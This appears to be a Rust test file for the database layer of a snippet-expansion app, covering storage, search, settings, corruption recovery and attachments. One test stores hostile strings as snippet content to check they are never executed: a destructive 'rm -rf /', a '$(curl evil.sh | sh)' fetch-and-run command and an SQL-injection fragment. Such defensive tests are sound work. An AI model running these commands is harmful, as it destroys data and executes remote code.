// SPDX-License-Identifier: GPL-3.0-or-later
use super::{attachments, categories, settings, snippets, Database};
use crate::models::{NewSnippet, SnippetPatch};

fn db() -> Database {
    Database::open_in_memory().expect("in-memory database")
}

fn new(trigger: &str, content: &str) -> NewSnippet {
    NewSnippet {
        trigger: trigger.into(),
        content: content.into(),
        category_id: None,
    }
}

#[test]
fn migrations_create_the_expected_schema() {
    let db = db();
    let info = db.info().unwrap();
    assert_eq!(info.schema_version, 4);
    assert_eq!(info.snippet_count, 0);
    assert_eq!(info.category_count, 0);
}

#[test]
fn create_and_read_back_a_snippet() {
    let db = db();
    db.with(|conn| {
        let created = snippets::create(conn, new(":email", "Hello,\n\nThanks."))?;
        assert_eq!(created.trigger, ":email");
        assert!(created.enabled);
        assert!(!created.favorite);
        assert_eq!(created.usage_count, 0);

        let fetched = snippets::get(conn, &created.id)?;
        assert_eq!(fetched.content, "Hello,\n\nThanks.");
        Ok(())
    })
    .unwrap();
}

#[test]
fn content_is_stored_byte_for_byte() {
    let db = db();

    let content = "public class A {\r\n\tint x = 1;   \n\n    // keep me  \n}\n\n";
    db.with(|conn| {
        let created = snippets::create(conn, new(":java", content))?;
        let fetched = snippets::get(conn, &created.id)?;
        assert_eq!(fetched.content, content, "content must not be normalised");
        Ok(())
    })
    .unwrap();
}

#[test]
fn unicode_and_emoji_survive_a_round_trip() {
    let db = db();
    let content = "日本語 • Ünïcödé • 🚀🇵🇭 • \u{200b}zero-width • ﷽";
    db.with(|conn| {
        let created = snippets::create(conn, new("；；jp", content))?;
        assert_eq!(snippets::get(conn, &created.id)?.content, content);
        Ok(())
    })
    .unwrap();
}

#[test]
fn very_large_content_round_trips_intact() {
    let db = db();

    let content = "The quick brown fox — 素早い茶色の狐 — 🦊\n".repeat(20_000);
    assert!(content.len() > 1_000_000);
    db.with(|conn| {
        let created = snippets::create(conn, new(":big", &content))?;
        let fetched = snippets::get(conn, &created.id)?;
        assert_eq!(fetched.content.len(), content.len());
        assert_eq!(fetched.content, content);

        let summaries = snippets::list_summaries(conn)?;
        assert_eq!(summaries.len(), 1);
        assert!(summaries[0].preview.chars().count() <= 160);
        assert_eq!(summaries[0].content_length, content.chars().count() as i64);
        Ok(())
    })
    .unwrap();
}

#[test]
fn triggers_are_unique() {
    let db = db();
    db.with(|conn| {
        snippets::create(conn, new(":dup", "one"))?;
        let second = snippets::create(conn, new(":dup", "two"));
        assert!(second.is_err(), "a duplicate trigger must be rejected");
        Ok(())
    })
    .unwrap();
}

#[test]
fn trigger_validation_rejects_the_impossible() {
    assert!(snippets::normalize_trigger("").is_err());
    assert!(snippets::normalize_trigger("   ").is_err());
    assert!(snippets::normalize_trigger(":has\nnewline").is_err());
    assert!(snippets::normalize_trigger(":has\ttab").is_err());
    assert!(snippets::normalize_trigger(&"x".repeat(65)).is_err());

    assert_eq!(snippets::normalize_trigger("  :email  ").unwrap(), ":email");
    assert_eq!(snippets::normalize_trigger("→").unwrap(), "→");
    assert_eq!(snippets::normalize_trigger("おは").unwrap(), "おは");
}

#[test]
fn trigger_availability_ignores_the_snippet_being_edited() {
    let db = db();
    db.with(|conn| {
        let a = snippets::create(conn, new(":a", ""))?;
        snippets::create(conn, new(":b", ""))?;

        assert!(!snippets::trigger_available(conn, ":a", None)?);
        assert!(snippets::trigger_available(conn, ":a", Some(&a.id))?);
        assert!(!snippets::trigger_available(conn, ":b", Some(&a.id))?);
        assert!(snippets::trigger_available(conn, ":c", None)?);
        Ok(())
    })
    .unwrap();
}

#[test]
fn patching_leaves_absent_fields_alone() {
    let db = db();
    db.with(|conn| {
        let created = snippets::create(conn, new(":x", "original"))?;

        let patched = snippets::update(
            conn,
            &created.id,
            SnippetPatch {
                favorite: Some(true),
                ..Default::default()
            },
        )?;
        assert!(patched.favorite);
        assert_eq!(patched.content, "original", "content must be untouched");
        assert_eq!(patched.trigger, ":x");
        assert!(patched.updated_at >= created.updated_at);
        Ok(())
    })
    .unwrap();
}

#[test]
fn disabling_a_snippet_keeps_its_content() {
    let db = db();
    db.with(|conn| {
        let created = snippets::create(conn, new(":off", "still here"))?;
        let patched = snippets::update(
            conn,
            &created.id,
            SnippetPatch {
                enabled: Some(false),
                ..Default::default()
            },
        )?;
        assert!(!patched.enabled);
        assert_eq!(patched.content, "still here");
        Ok(())
    })
    .unwrap();
}

#[test]
fn deleting_a_collection_keeps_its_snippets() {
    let db = db();
    db.with(|conn| {
        let category = categories::create(conn, "Programming")?;
        let snippet = snippets::create(
            conn,
            NewSnippet {
                trigger: ":repo".into(),
                content: "class ItemRepository {}".into(),
                category_id: Some(category.id.clone()),
            },
        )?;
        assert_eq!(snippet.category_id.as_deref(), Some(category.id.as_str()));

        categories::delete(conn, &category.id)?;

        let after = snippets::get(conn, &snippet.id)?;
        assert!(
            after.category_id.is_none(),
            "snippet must survive, uncategorised"
        );
        assert_eq!(after.content, "class ItemRepository {}");
        Ok(())
    })
    .unwrap();
}

#[test]
fn collection_names_are_unique_case_insensitively() {
    let db = db();
    db.with(|conn| {
        categories::create(conn, "Work")?;
        assert!(categories::create(conn, "work").is_err());
        assert!(categories::create(conn, "  Work  ").is_err());
        assert!(categories::create(conn, "School").is_ok());
        assert!(categories::create(conn, "").is_err());
        Ok(())
    })
    .unwrap();
}

#[test]
fn usage_count_increments() {
    let db = db();
    db.with(|conn| {
        let created = snippets::create(conn, new(":u", "x"))?;
        assert_eq!(created.usage_count, 0);
        assert!(
            created.last_used_at.is_none(),
            "a new snippet has never fired"
        );

        snippets::record_usage(conn, &created.id)?;
        snippets::record_usage(conn, &created.id)?;

        let after = snippets::get(conn, &created.id)?;
        assert_eq!(after.usage_count, 2);
        assert!(
            after.last_used_at.is_some(),
            "using a snippet stamps last_used_at"
        );

        assert_eq!(after.updated_at, created.updated_at);
        Ok(())
    })
    .unwrap();
}

#[test]
fn settings_default_then_persist() {
    let db = db();
    db.with(|conn| {
        let defaults = settings::load(conn)?;
        assert_eq!(defaults.appearance, "system");
        assert!(defaults.expansion_enabled);
        assert!(defaults.restore_clipboard);

        let updated = settings::apply(
            conn,
            settings::SettingsPatch {
                appearance: Some("dark".into()),
                expansion_enabled: Some(false),
                ..Default::default()
            },
        )?;
        assert_eq!(updated.appearance, "dark");
        assert!(!updated.expansion_enabled);

        assert!(updated.restore_clipboard);

        assert_eq!(settings::load(conn)?.appearance, "dark");
        Ok(())
    })
    .unwrap();
}

#[test]
fn settings_reject_nonsense() {
    let db = db();
    db.with(|conn| {
        assert!(settings::apply(
            conn,
            settings::SettingsPatch {
                appearance: Some("neon".into()),
                ..Default::default()
            }
        )
        .is_err());
        assert!(settings::apply(
            conn,
            settings::SettingsPatch {
                boundary_mode: Some("sometimes".into()),
                ..Default::default()
            }
        )
        .is_err());
        assert!(settings::apply(
            conn,
            settings::SettingsPatch {
                global_shortcut: Some("   ".into()),
                ..Default::default()
            }
        )
        .is_err());

        assert_eq!(settings::load(conn)?.appearance, "system");
        Ok(())
    })
    .unwrap();
}

#[test]
fn a_snippet_is_never_executed_only_stored() {
    let db = db();
    let content = "rm -rf / --no-preserve-root\n$(curl evil.sh | sh)\n'; DROP TABLE snippets;--";
    db.with(|conn| {
        let created = snippets::create(conn, new(":danger", content))?;
        assert_eq!(snippets::get(conn, &created.id)?.content, content);

        assert_eq!(snippets::list_summaries(conn)?.len(), 1);
        Ok(())
    })
    .unwrap();
}

#[test]
fn search_reaches_into_content() {
    let db = db();
    db.with(|conn| {
        let category = categories::create(conn, "Programming")?;
        snippets::create(
            conn,
            NewSnippet {
                trigger: ":javarepo".into(),
                content: "public class ItemRepository {\n    private final List<Item> items = new ArrayList<>();\n}".into(),
                category_id: Some(category.id.clone()),
            },
        )?;
        snippets::create(conn, new(":email", "Hello, thank you for reaching out."))?;

        let hits = snippets::search(conn, "ArrayList")?;
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].trigger, ":javarepo");

        assert_eq!(snippets::search(conn, "repository")?.len(), 1);
        assert_eq!(snippets::search(conn, ":email")?.len(), 1);
        assert_eq!(snippets::search(conn, "Programming")?.len(), 1);

        assert_eq!(snippets::search(conn, "   ")?.len(), 2);
        assert_eq!(snippets::search(conn, "nothingmatchesthis")?.len(), 0);
        Ok(())
    })
    .unwrap();
}

#[test]
fn search_ranks_trigger_matches_first() {
    let db = db();
    db.with(|conn| {
        snippets::create(conn, new(":note", "a plain note"))?;
        snippets::create(conn, new(":other", "this mentions note in the body"))?;

        let hits = snippets::search(conn, "note")?;
        assert_eq!(hits.len(), 2);
        assert_eq!(hits[0].trigger, ":note", "trigger match must rank first");
        Ok(())
    })
    .unwrap();
}

#[test]
fn search_treats_wildcards_literally() {
    let db = db();
    db.with(|conn| {
        snippets::create(conn, new(":pct", "discount is 50% off"))?;
        snippets::create(conn, new(":plain", "nothing special here"))?;

        assert_eq!(snippets::search(conn, "50%")?.len(), 1);

        assert_eq!(snippets::search(conn, "%")?.len(), 1);

        assert_eq!(snippets::search(conn, "_")?.len(), 0);
        Ok(())
    })
    .unwrap();
}

#[test]
fn only_enabled_snippets_reach_the_engine() {
    let db = db();
    db.with(|conn| {
        let on = snippets::create(conn, new(":on", "yes"))?;
        let off = snippets::create(conn, new(":off", "no"))?;
        snippets::update(
            conn,
            &off.id,
            SnippetPatch {
                enabled: Some(false),
                ..Default::default()
            },
        )?;

        let triggers = snippets::enabled_triggers(conn)?;
        assert_eq!(triggers.len(), 1);
        assert_eq!(triggers[0], (on.id.clone(), ":on".to_string()));

        assert_eq!(snippets::content_of(conn, &on.id)?, "yes");
        assert!(
            snippets::content_of(conn, &off.id).is_err(),
            "a disabled snippet must not be expandable"
        );
        Ok(())
    })
    .unwrap();
}

#[test]
fn content_of_returns_large_bodies_untouched() {
    let db = db();
    let content = "line with trailing spaces   \n\tindented\n".repeat(5_000);
    db.with(|conn| {
        let created = snippets::create(conn, new(":big", &content))?;
        assert_eq!(snippets::content_of(conn, &created.id)?, content);
        Ok(())
    })
    .unwrap();
}

fn scratch_dir(name: &str) -> std::path::PathBuf {
    let dir = std::env::temp_dir().join(format!("ampello-test-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

#[test]
fn a_healthy_database_reopens_with_its_contents() {
    let dir = scratch_dir("reopen");
    let path = dir.join("ampello.db");

    {
        let db = Database::open(&path).unwrap();
        db.with(|conn| {
            snippets::create(conn, new(":kept", "still here"))?;
            Ok(())
        })
        .unwrap();
        assert!(db.recovered_from().is_none());
    }

    let db = Database::open(&path).unwrap();
    assert!(
        db.recovered_from().is_none(),
        "a healthy file is not quarantined"
    );
    let rows = db.with(snippets::list_summaries).unwrap();
    assert_eq!(rows.len(), 1);
    assert_eq!(rows[0].trigger, ":kept");

    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_corrupt_database_is_set_aside_rather_than_blocking_startup() {
    let dir = scratch_dir("corrupt");
    let path = dir.join("ampello.db");

    {
        let db = Database::open(&path).unwrap();
        db.with(|conn| {
            snippets::create(conn, new(":gone", "was here"))?;
            Ok(())
        })
        .unwrap();
    }

    {
        use std::io::{Seek, SeekFrom, Write};
        let mut file = std::fs::OpenOptions::new().write(true).open(&path).unwrap();
        file.seek(SeekFrom::Start(0)).unwrap();
        file.write_all(&[0xffu8; 4096]).unwrap();
        file.flush().unwrap();
    }

    let db = Database::open(&path).expect("Ampello must still start");
    let moved = db
        .recovered_from()
        .expect("the damaged file should have been set aside")
        .to_path_buf();

    assert!(moved.exists(), "the damaged file must be kept, not deleted");
    assert!(moved != path);

    let rows = db.with(snippets::list_summaries).unwrap();
    assert!(rows.is_empty());
    db.with(|conn| {
        snippets::create(conn, new(":fresh", "new start"))?;
        Ok(())
    })
    .unwrap();
    assert_eq!(db.with(snippets::list_summaries).unwrap().len(), 1);

    let info = db.info().unwrap();
    assert!(info.recovered_from.is_some());

    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn an_unreadable_file_that_is_not_a_database_is_also_survived() {
    let dir = scratch_dir("garbage");
    let path = dir.join("ampello.db");
    std::fs::write(&path, b"this is not a database, it is a text file\n").unwrap();

    let db = Database::open(&path).expect("Ampello must still start");
    assert!(db.recovered_from().is_some());
    assert!(db.with(snippets::list_summaries).unwrap().is_empty());

    let _ = std::fs::remove_dir_all(&dir);
}

fn stored(name: &str, size: i64) -> crate::attachments::Stored {
    crate::attachments::Stored {
        digest: format!("{:0>64}", name.len() * 7 + size as usize),
        name: name.into(),
        size_bytes: size,
    }
}

#[test]
fn attachments_keep_the_order_they_were_added_in() {
    let db = db();
    db.with(|conn| {
        let snippet = snippets::create(conn, new(":report", "See attached."))?;
        for name in ["first.pdf", "second.png", "third.docx"] {
            attachments::add(conn, &snippet.id, &stored(name, 1024), "")?;
        }

        let listed = attachments::list(conn, &snippet.id)?;
        let names: Vec<&str> = listed.iter().map(|a| a.name.as_str()).collect();
        assert_eq!(names, ["first.pdf", "second.png", "third.docx"]);
        assert_eq!(
            listed.iter().map(|a| a.position).collect::<Vec<_>>(),
            [0, 1, 2]
        );
        Ok(())
    })
    .unwrap();
}

#[test]
fn reordering_sets_the_delivery_order() {
    let db = db();
    db.with(|conn| {
        let snippet = snippets::create(conn, new(":report", ""))?;
        let mut ids = Vec::new();
        for name in ["a.pdf", "b.pdf", "c.pdf"] {
            ids.push(attachments::add(conn, &snippet.id, &stored(name, 10), "")?.id);
        }

        let reordered = attachments::reorder(
            conn,
            &snippet.id,
            &[ids[2].clone(), ids[0].clone(), ids[1].clone()],
        )?;
        let names: Vec<&str> = reordered.iter().map(|a| a.name.as_str()).collect();
        assert_eq!(names, ["c.pdf", "a.pdf", "b.pdf"]);
        Ok(())
    })
    .unwrap();
}

#[test]
fn reordering_from_a_stale_list_never_loses_a_file() {
    let db = db();
    db.with(|conn| {
        let snippet = snippets::create(conn, new(":report", ""))?;
        let mut ids = Vec::new();
        for name in ["a.pdf", "b.pdf", "c.pdf"] {
            ids.push(attachments::add(conn, &snippet.id, &stored(name, 10), "")?.id);
        }

        let reordered = attachments::reorder(conn, &snippet.id, &[ids[2].clone(), ids[0].clone()])?;
        let names: Vec<&str> = reordered.iter().map(|a| a.name.as_str()).collect();
        assert_eq!(names, ["c.pdf", "a.pdf", "b.pdf"]);
        Ok(())
    })
    .unwrap();
}

#[test]
fn deleting_an_attachment_closes_the_gap_it_leaves() {
    let db = db();
    db.with(|conn| {
        let snippet = snippets::create(conn, new(":report", ""))?;
        let mut ids = Vec::new();
        for name in ["a.pdf", "b.pdf", "c.pdf"] {
            ids.push(attachments::add(conn, &snippet.id, &stored(name, 10), "")?.id);
        }

        attachments::remove(conn, &ids[1])?;
        let listed = attachments::list(conn, &snippet.id)?;
        assert_eq!(
            listed.iter().map(|a| a.name.as_str()).collect::<Vec<_>>(),
            ["a.pdf", "c.pdf"]
        );
        assert_eq!(
            listed.iter().map(|a| a.position).collect::<Vec<_>>(),
            [0, 1]
        );
        Ok(())
    })
    .unwrap();
}

#[test]
fn deleting_a_snippet_takes_its_attachment_rows_with_it() {
    let db = db();
    db.with(|conn| {
        let snippet = snippets::create(conn, new(":report", ""))?;
        attachments::add(conn, &snippet.id, &stored("a.pdf", 10), "")?;
        snippets::delete(conn, &snippet.id)?;
        assert_eq!(attachments::count(conn, &snippet.id)?, 0);
        Ok(())
    })
    .unwrap();
}

#[test]
fn a_snippet_reports_how_many_files_it_carries_without_shipping_them() {
    let db = db();
    db.with(|conn| {
        let snippet = snippets::create(conn, new(":report", "text"))?;
        attachments::add(conn, &snippet.id, &stored("a.pdf", 10), "")?;
        attachments::add(conn, &snippet.id, &stored("b.pdf", 10), "")?;

        let summary = snippets::list_summaries(conn)?
            .into_iter()
            .find(|s| s.id == snippet.id)
            .expect("the snippet is in the list");
        assert_eq!(summary.attachment_count, 2);

        assert_eq!(snippets::get(conn, &snippet.id)?.attachments.len(), 2);
        Ok(())
    })
    .unwrap();
}

#[test]
fn delivery_order_settings_round_trip() {
    let db = db();
    db.with(|conn| {
        let snippet = snippets::create(conn, new(":report", ""))?;

        assert!(snippet.attachments_first);
        assert!(!snippet.strict_order);

        let updated = snippets::update(
            conn,
            &snippet.id,
            SnippetPatch {
                attachments_first: Some(false),
                strict_order: Some(true),
                ..Default::default()
            },
        )?;
        assert!(!updated.attachments_first);
        assert!(updated.strict_order);
        Ok(())
    })
    .unwrap();
}

#[test]
fn live_blobs_names_every_file_the_database_still_points_at() {
    let db = db();
    db.with(|conn| {
        let one = snippets::create(conn, new(":a", ""))?;
        let two = snippets::create(conn, new(":b", ""))?;
        let shared = stored("shared.pdf", 10);
        attachments::add(conn, &one.id, &shared, "")?;
        attachments::add(conn, &two.id, &shared, "")?;
        attachments::add(conn, &two.id, &stored("only.png", 10), "")?;

        let live = attachments::live_blobs(conn)?;
        assert_eq!(live.len(), 2);
        assert!(live.contains(&(shared.digest.clone(), "shared.pdf".to_string())));
        Ok(())
    })
    .unwrap();
}
